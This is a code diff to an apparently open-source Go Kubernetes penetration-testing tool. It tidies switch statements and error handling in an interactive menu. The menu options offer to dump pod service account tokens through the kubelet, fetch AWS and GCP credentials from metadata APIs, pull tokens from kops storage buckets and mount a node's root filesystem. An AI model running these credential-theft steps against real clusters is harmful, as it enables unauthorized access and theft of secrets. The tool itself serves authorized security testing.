@@ -722,7 +722,7 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 								println("===============================================================================================")
 								println("Asking Kubelet to dump service account token via URL:", urlExecPod)
 								println("")
-								reqExecPod, err := http.NewRequest("POST", urlExecPod, strings.NewReader(data.Encode()))
+								reqExecPod, _ := http.NewRequest("POST", urlExecPod, strings.NewReader(data.Encode()))
 								reqExecPod.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 								reqExecPod.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))
 								respExecPod, err := sslClient.Do(reqExecPod)
@@ -736,7 +736,7 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 									continue
 								}
 								defer respExecPod.Body.Close()
-								bodyExecCommand, err := ioutil.ReadAll(respExecPod.Body)
+								bodyExecCommand, _ := ioutil.ReadAll(respExecPod.Body)
 								token := string(bodyExecCommand)
 								println("[+] Got service account token for", "ns:"+podNamespace+" pod:"+podName+" container:"+containerName+":", token)
 								println("")
@@ -907,7 +907,7 @@ Leave off the "kubectl" part of the command.  For example:
 			for _, line := range kubectlOutputLines {
 				println(line)
 			}
-			break
+
 		// [1] Enter a different service account token
 		case "1", "sa-menu", "service-account-menu", "sa", "service-account":
 			println("Current primary service account: %s", connectionString.TokenName)
@@ -962,7 +962,7 @@ Leave off the "kubectl" part of the command.  For example:
 				switch input {
 				case "1":
 					assignServiceAccountToConnection(serviceAccount, &connectionString)
-					break
+
 				case "2":
 					break
 				default:
@@ -997,11 +997,11 @@ Leave off the "kubectl" part of the command.  For example:
 			switch input {
 			case "1", "list":
 				Namespaces = PrintNamespaces(connectionString)
-				break
+
 			case "2", "switch":
 				Namespaces = PrintNamespaces(connectionString)
 				SwitchNamespace(&connectionString)
-				break
+
 			default:
 				break
 			}
@@ -1010,12 +1010,10 @@ Leave off the "kubectl" part of the command.  For example:
 		case "3", "get-pods", "list-pods":
 			println("\n[+] Printing a list of Pods in this namespace......")
 			printListOfPods(connectionString)
-			break
 
 		//[4] Get complete info on all pods (json)
 		case "4", "dump-podinfo", "dump-pod-info":
 			GetPodsInfo(connectionString, &podInfo)
-			break
 
 		//	[6] Enter AWS IAM credentials manually [enter-aws-credentials]
 		case "6", "enter-aws-credentials", "aws-creds":
@@ -1028,8 +1026,6 @@ Leave off the "kubectl" part of the command.  For example:
 			println(" New AWS credentials are: \n")
 			DisplayAWSIAMCredentials(awsCredentials)
 
-			break
-
 		// [7] Attempt to Assume a Different AWS Role [aws-assume-role]
 		case "7", "aws-assume-role":
 
@@ -1038,9 +1034,8 @@ Leave off the "kubectl" part of the command.  For example:
 			println("[+] Enter a role to assume, in the format arn:aws:iam::123456789012:role/roleName : ")
 			fmt.Scanln(&input)
 
-			matched, _ := regexp.MatchString(`arn:aws:iam::\d{12,}:\w+\/\w+`, input)
-			if !matched {
-
+			iamArnValidationPattern := regexp.MustCompile(`arn:aws:iam::\d{12,}:\w+\/\w+`)
+			if !iamArnValidationPattern.MatchString(input) {
 				println("String entered isn't a AWS role name in the format requested.\n")
 				break
 			}
@@ -1068,7 +1063,6 @@ Leave off the "kubectl" part of the command.  For example:
 			for _, svcAcct := range serviceAccountTokens {
 				println("[+] Service account found: ", svcAcct)
 			}
-			break
 
 		// [11] Get a service account token from a secret
 		case "11", "get-secret", "secret-to-sa":
@@ -1101,7 +1095,6 @@ Leave off the "kubectl" part of the command.  For example:
 			token, err := base64.StdEncoding.DecodeString(opaqueToken)
 			if err != nil {
 				println("[-] ERROR: couldn't decode")
-				break
 			} else {
 				fmt.Printf("[+] Saved %s // %s\n", secretName, token)
 				serviceAccounts = append(serviceAccounts, makeNewServiceAccount(secretName, string(token), "Cluster Secret"))
@@ -1145,7 +1138,6 @@ Leave off the "kubectl" part of the command.  For example:
 			fmt.Scanln(&port)
 			// TODO: Rename/refactor MountRootFS so we get more capabilities in case the node does not run cron
 			MountRootFS(allPods, connectionString, ip, port)
-			break
 
 		// [12] Request IAM credentials from AWS Metadata API [AWS only]
 		case "12", "get-aws-token":
@@ -1159,8 +1151,6 @@ Leave off the "kubectl" part of the command.  For example:
 
 			awsCredentials = result
 			DisplayAWSIAMCredentials(awsCredentials)
-
-			break
 
 		// [13] Request IAM credentials from GCP Metadata API [GCP only]
 		case "13", "get-gcp-token":
@@ -1186,7 +1176,6 @@ Leave off the "kubectl" part of the command.  For example:
 				println(GetGCPBearerTokenFromMetadataAPI(account))
 			}
 			println(" ")
-			break
 
 		// [14] Request kube-env from GCP Metadata API [GCP only]
 		case "14", "attack-kube-env-gcp":
@@ -1206,8 +1195,6 @@ Leave off the "kubectl" part of the command.  For example:
 			for _, line := range kubeEnvLines {
 				println(line)
 			}
-
-			break
 
 		// [15] Pull Kubernetes service account tokens from Kop's bucket in GCS [GCP only]
 		case "15", "attack-kops-gcs-1":
@@ -1328,8 +1315,6 @@ Leave off the "kubectl" part of the command.  For example:
 			//
 			// Don't forget to base64 decode with base64.StdEncoding.DecodeString()
 
-			break
-
 		// [16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
 		case "16":
 			var storeTokens string
@@ -1434,7 +1419,6 @@ Leave off the "kubectl" part of the command.  For example:
 
 				}
 			}
-			break
 
 		case "17", "aws-s3-ls", "aws-ls-s3", "ls-s3", "s3-ls":
 			// [17] List AWS S3 Buckets accessible (Auto-Refreshing Metadata API credentials) [AWS]
@@ -1466,8 +1450,6 @@ Leave off the "kubectl" part of the command.  For example:
 				println(bucket)
 			}
 
-			break
-
 		case "18", "aws-s3-ls-objects", "aws-s3-list-objects", "aws-s3-list-bucket":
 			// [18] List contents of an AWS S3 Bucket (Auto-Refreshing Metadata API credentials) [AWS]
 			var bucket string
@@ -1483,10 +1465,6 @@ Leave off the "kubectl" part of the command.  For example:
 				ListBucketObjects(awsCredentials, bucket)
 			}
 
-			break
-
-		case "19":
-			break
 		// [21] Run command in one or all pods in this namespace
 		case "21", "exec-via-api":
 
@@ -1676,7 +1654,7 @@ Leave off the "kubectl" part of the command.  For example:
 			fmt.Println("[+] Using method " + method + " for URL " + urlWithData)
 
 			// Build the request, adding in any headers found so far.
-			request, err := http.NewRequest(method, fullURL, nil)
+			request, _ := http.NewRequest(method, fullURL, nil)
 			for _, header := range headers {
 				request.Header.Add(header.LHS, header.RHS)
 			}
@@ -1685,7 +1663,7 @@ Leave off the "kubectl" part of the command.  For example:
 			// just above with this code by getting the request variable scoped
 			// outside this if block?
 			if method != "GET" {
-				request, err = http.NewRequest(method, fullURL, dataSection)
+				request, _ = http.NewRequest(method, fullURL, dataSection)
 				for _, header := range headers {
 					request.Header.Add(header.LHS, header.RHS)
 				}
@@ -1707,7 +1685,7 @@ Leave off the "kubectl" part of the command.  For example:
 				continue
 			}
 			defer response.Body.Close()
-			responseBody, err := ioutil.ReadAll(response.Body)
+			responseBody, _ := ioutil.ReadAll(response.Body)
 			responseBodyString := string(responseBody)
 			println(responseBodyString)
 			println("")
@@ -1734,12 +1712,7 @@ Leave off the "kubectl" part of the command.  For example:
 			case "false", "0", "f":
 				UseAuthCanI = false
 			}
-			break
 
-		case "98":
-			break
-		case "99":
-			break
 		default:
 			fmt.Println("Command unrecognized.")
 		}
